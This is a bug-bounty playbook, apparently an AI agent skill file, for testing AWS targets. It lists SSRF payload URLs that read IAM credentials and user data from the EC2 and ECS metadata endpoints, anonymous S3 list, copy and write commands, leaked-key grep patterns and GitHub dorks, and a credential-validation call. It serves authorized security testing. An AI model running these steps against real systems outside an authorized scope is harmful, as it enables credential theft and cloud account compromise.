---
name: aws-cloud-bounty-playbook
description: "AWS-focused bug bounty playbook (TRACK A). Consolidates the 4-note AWS cloud attack surface cluster: IAM controls, Secrets Manager/SSM exposure, ECS/EKS container escape, EC2 user data and IMDS credential leakage. Covers: enumeration order, finding types with H/C ceiling, evidence collection, SSRF→IMDS chain, container escape chain, secrets exfil chain, CI gate bypass checks. Load when target has AWS infrastructure — especially SSRF endpoints, admin panels on EC2, or Kubernetes/ECS workloads."
trigger_keywords: "aws bounty, aws bug bounty, h1 aws, whitehat bounty aws, aws cloud bounty, aws imds, ecs escape, eks escape, secrets manager bounty, ssm parameter store bounty, ec2 ssrf, aws container escape, aws credentials, iam escalation bounty"
version: 1.0
created: 2026-03-02
owner: cyber-operator
tags: [projects, cyber, bug-bounty]
---

# AWS Cloud Bug Bounty Playbook (TRACK A)

> **Load with:** your engagement protocol
> **Knowledge base:** 4-note AWS cluster — all cross-linked, load as needed
> **Session constraint:** FULL AUTONOMY ONLY unless the operator unlocks auth/cloud console

---

## PRE-SCAN CHECKLIST

```
1. Read your program index              → duplicate prevention
2. Read {program}/program-scope.md      → what AWS services are in scope
3. Check prior findings                 → avoid re-filing same vectors
4. Load specialist patterns:
   - SSRF chain      → a technique-reference note
   - IAM/PassRole    → a technique-reference note
   - Secrets exposure → a technique-reference note
   - Container escape → a technique-reference note
   - SSRF methodology → ssrf-methodology.md
5. Identify attack surface type:
   □ App with URL-fetch feature → SSRF→IMDS chain (highest ROI)
   □ ECS/EKS workloads visible  → container escape chain
   □ S3 URLs in source          → bucket exposure
   □ API with AWS credentials   → secrets in transit
   □ Admin panel on EC2         → user data / IMDS direct
```

---

## AWS ATTACK SURFACE MAP

### Surface Priority Matrix

| Surface | Finding Ceiling | Detection Difficulty | Start Here? |
|---------|----------------|---------------------|-------------|
| SSRF → IMDS → AWS credentials | Critical | Medium | ✅ YES |
| Secrets in user data | High | Low | ✅ YES |
| S3 public bucket (data) | High-Critical | Low | ✅ YES |
| IAM PassRole escalation | Critical | High | ⚠️ Needs console access |
| ECS privileged container | High | High | ⚠️ Needs runtime access |
| EKS hostPath / hostPID | High | High | ⚠️ Needs cluster access |
| Secrets Manager overbroad read | High | High | ⚠️ Needs IAM context |
| IMDSv1 enabled (SSRF amplifier) | High | Medium | ✅ Passive check |

---

## CHAIN 1: SSRF → IMDS → AWS Credentials (Highest ROI)

**Pattern:** App fetches user-controlled URL → no SSRF filter → hits EC2 metadata.

```bash
# Step 1: Confirm SSRF exists (use OOB webhook first)
# — webhook: interactsh, Burp Collaborator, canarytokens

# Step 2: Test IMDSv1 path (if enabled, no token needed)
http://169.254.169.254/latest/meta-data/

# Step 3: Enumerate IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 4: Retrieve credentials (IMDSv1 one-shot)
http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}

# Step 5: Test IMDSv2 (requires PUT first — harder via SSRF)
# Most SSRF bugs cannot complete PUT + follow-up GET
# IMDSv2 resistance = document SSRF but note IMDS is mitigated

# Step 6: Check user data (separate endpoint)
http://169.254.169.254/latest/user-data
```

**Evidence to collect:**
```
- HTTP request showing URL parameter / fetch feature
- HTTP response with 169.254.169.254 content (meta-data index OR credentials)
- Screenshot / curl output showing AccessKeyId + SecretAccessKey + Token
- If user data: show exact secret material retrieved
- If IMDSv2 blocks: document SSRF confirmed + IMDS mitigated (lower severity, still H reportable)
```

**Severity calibration:**
| Outcome | Severity |
|---------|----------|
| AWS credentials retrieved (IAM role) | Critical |
| Secrets/passwords in user data | High |
| SSRF confirmed, IMDS blocked by IMDSv2 | Medium |
| SSRF confirmed, only metadata (no creds) | Low-Medium |

**Pattern note:** [[../../a reference note|Cyber-AWS-UserData-IMDS]] — full defense details + SSRF test harness

---

## CHAIN 2: S3 Bucket Exposure

**Fast check from recon:**
```bash
# Extract S3 references from source / responses
grep -oP 'https?://[a-zA-Z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com[/\w.-]*'

# Common naming patterns to try:
# {target}-prod, {target}-staging, {target}-dev, {target}-backup
# {target}-uploads, {target}-assets, {target}-data, {target}-logs

# Test anonymous access
aws s3 ls s3://{bucket-name} --no-sign-request
aws s3 cp s3://{bucket-name}/sensitive.csv . --no-sign-request

# Test for write (check scope first!)
# echo "test" | aws s3 cp - s3://{bucket-name}/bounty-test.txt --no-sign-request
# DELETE the test file immediately if write works
```

**Pattern note:** [[../../a reference note|Cyber-AWS-IAM-Controls]] — S3 Block Public Access hierarchy

---

## CHAIN 3: Secrets in Source / User Data

**Where to look (passive, zero-auth):**
```bash
# 1. Source maps → app bundle → grep for AWS patterns
# Pattern: AKIA[0-9A-Z]{16} (AWS Access Key)
grep -rP 'AKIA[0-9A-Z]{16}' extracted-sourcemaps/

# 2. JS files loaded by app — search for config/init blocks
grep -P '(secretAccessKey|aws_secret|AWS_SECRET)' *.js

# 3. Publicly readable user data (if instance ID known and scope allows)
# NOT typically accessible without instance ID — usually chains with SSRF

# 4. GitHub dorking for target org
# "AKIA" org:target-company
# "aws_secret_access_key" org:target-company
# filename:.env "AWS"
```

**Validate credential without using it:**
```bash
# Check if key is valid — read-only metadata call
aws sts get-caller-identity --profile found-creds
# This WILL appear in CloudTrail — use once, document immediately
```

**Pattern note:** [[../../a reference note|Cyber-AWS-Secrets-Controls]] — Secrets Manager / SSM detection

---

## CHAIN 4: Container Escape (ECS/EKS in scope)

**From zero-auth recon only — cannot test runtime without auth:**

**Passive indicators to document:**
```bash
# ECS task metadata endpoint (if accessible from app context)
http://169.254.170.2/v4/     # ECS task metadata v4 (internal)
# → exposes task ARN, cluster name, task role credentials

# EKS — check for exposed k8s API or dashboard
# Often accessible if VPC misconfigured
https://k8s-api.target.com/api/v1/namespaces   # anonymous access?
https://dashboard.target.com                    # K8s dashboard exposed?

# Container registry — ECR public or exposed?
# Check DNS: {account}.dkr.ecr.{region}.amazonaws.com
aws ecr describe-repositories --registry-id {account} --no-sign-request
```

**If authenticated/authorized session (unlock explicitly):**
- Check task definition for `privileged: true` → report directly
- Check ECS agent config for `ECS_AWSVPC_BLOCK_IMDS` absence
- Check pod security via `kubectl get namespaces -o yaml | grep pod-security`

**Pattern note:** [[../../a reference note|Cyber-AWS-Container-Escape]] — full escape chains + Pod Security Standards

---

## FINDING TYPES × SEVERITY (AWS-Specific)

| Finding | Severity | H1 Payout Range | Evidence Required |
|---------|----------|----------------|------------------|
| AWS credentials retrieved via SSRF→IMDS | Critical | $5K–$50K+ | Credentials shown, role ARN, sts:GetCallerIdentity once |
| Secrets (DB password, API key) in user data | High | $2K–$15K | Raw user data response, secret pattern highlighted |
| S3 bucket with sensitive PII readable | High-Critical | $3K–$25K+ | File listing + sample record (non-PII preview only) |
| SSRF confirmed, IMDSv2 blocks IMDS | Medium | $500–$3K | SSRF PoC, note IMDS mitigated |
| S3 bucket writable (no exfil) | High | $1K–$5K | Write + immediate delete PoC |
| IMDSv1 enabled (no SSRF present) | Low-Medium | $100–$500 | Config evidence only |
| ECS task metadata v4 exposed anonymously | Medium-High | $1K–$5K | Metadata response showing task role ARN |
| Secrets in committed source / JS bundle | Medium-High | $500–$5K | Pattern + source location |
| K8s dashboard exposed anonymously | High | $2K–$10K | Screenshot + namespace listing |

---

## EVIDENCE COLLECTION TEMPLATE

```markdown
## AWS Cloud Finding — Evidence Package

### Target
- Program: {name}
- In-scope asset: {URL / ARN / service}
- AWS region: {if known}

### Vulnerability
- Type: [SSRF→IMDS | S3 exposure | Secrets in user data | Container escape]
- CWE: {918 for SSRF | 312 for secrets exposure | 284 for access control}
- CVSS: {calculate}

### Reproduction
1. {Step 1 — specific request/command}
2. {Step 2 — response / evidence}
3. {Step 3 — impact demonstration}

### Impact
- Credentials retrieved: [Yes/No] — if yes: AccessKeyId prefix only (never post full key)
- Role permissions: {sts:GetCallerIdentity output — redact if sensitive}
- Data accessible: {describe without reproducing PII}

### Remediation
- Short term: {specific fix}
- Long term: {structural control}
- Reference: {AWS doc URL}

### Evidence Files
- [ ] Request/response screenshot
- [ ] PoC curl command (sanitized)
- [ ] sts:GetCallerIdentity output (if credentials retrieved)
```

---

## CLOUDGOAT PRACTICE LABS

| Scenario | Chain It Practices | Defensive Notes |
|----------|-------------------|----------------|
| `ec2_ssrf` | SSRF → IMDS → credentials | IMDSv2 + SSRF allowlist defense |
| `cloud_breach_s3` | SSRF → IMDS → S3 access | Block IMDS, scope S3 bucket policy |
| `beanstalk_secrets` | Secrets in user data / env | No secrets in user data; Secrets Manager |
| `codebuild_secrets` | Secrets in build env | IaC secret scanning; rotation |
| `ecs_takeover` | ECS IMDS pivot | awsvpc IMDS block + task hardening |
| `ecs_privesc_evade_protection` | Container escape chain | GuardDuty Runtime Monitoring |

---

## QUICK DECISION TREE

```
Target has AWS infrastructure?
├── Does it have URL-fetch / webhook / proxy feature?
│   └── YES → CHAIN 1 (SSRF→IMDS) — start here
├── Does it reference S3 in source/headers?
│   └── YES → CHAIN 2 (S3 exposure) — passive recon
├── Is ECS/EKS in scope?
│   └── YES → CHAIN 4 (container escape) — passive first
├── Does source/JS contain AWS patterns?
│   └── YES → CHAIN 3 (secrets in source)
└── None of above
    └── Document IMDSv1 if enabled (passive check via config/docs)
```

---

## SPECIALIST PATTERN NOTES (Load As Needed)

| Pattern | When to Load |
|---------|-------------|
| [[../../a reference note\|Cyber-AWS-IAM-Controls]] | PassRole, S3 BPA, Lambda access, IMDS basics |
| [[../../a reference note\|Cyber-AWS-Secrets-Controls]] | Secrets Manager, SSM, KMS, execution role separation |
| [[../../a reference note\|Cyber-AWS-Container-Escape]] | ECS/EKS escape chains, IRSA, Pod Security Standards |
| [[../../a reference note\|Cyber-AWS-UserData-IMDS]] | User data leakage, AWS Config rules, SSRF test harness |
| [[../../a reference note\|Cyber-SSRF-Methodology]] | Full SSRF filter bypass matrix, DNS rebinding, OOB |
| [[../../a reference note\|Cyber-Cloud-Misconfiguration]] | S3 discovery, GCP/Azure metadata, Nuclei templates |

---

*AWS Cloud Bug Bounty Playbook v1.0 | Built 2026-03-02 | TRACK A — AWS | Owner: cyber-operator*
